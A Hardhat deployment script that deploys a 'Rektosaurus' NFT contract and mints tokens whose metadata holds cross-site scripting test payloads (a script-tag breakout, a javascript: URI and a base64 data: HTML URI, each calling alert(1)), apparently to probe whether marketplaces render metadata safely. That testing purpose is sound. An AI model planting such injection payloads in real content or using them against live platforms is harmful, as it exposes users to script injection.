// This is a script for deploying your contracts. You can adapt it to deploy
// yours, or create new ones.
async function main() {
  // This is just a convenience check
  if (network.name === "hardhat") {
    console.warn(
      "You are trying to deploy a contract to the Hardhat Network, which" +
        "gets automatically created and destroyed every time. Use the Hardhat" +
        " option '--network localhost'"
    );
  }

  // ethers is avaialble in the global scope
  const [deployer] = await ethers.getSigners();
  console.log(
    "Deploying the contracts with the account:",
    await deployer.getAddress()
  );

  const Rektosaurus = await ethers.getContractFactory("Rektosaurus");
  const rektosaurus = await Rektosaurus.deploy();
  await rektosaurus.deployed();

  console.log("Rektosaurus address:", rektosaurus.address);

  // Add some on-chain payloads

  await rektosaurus.mint(2, deployer.address, '"/><script>alert(1)</script>');
  await rektosaurus.mint(3, deployer.address, 'javascript:alert(1);');
  await rektosaurus.mint(4, deployer.address, "data:text/html;base64,PGh0bWw+PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD48L2h0bWw+Cg==");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
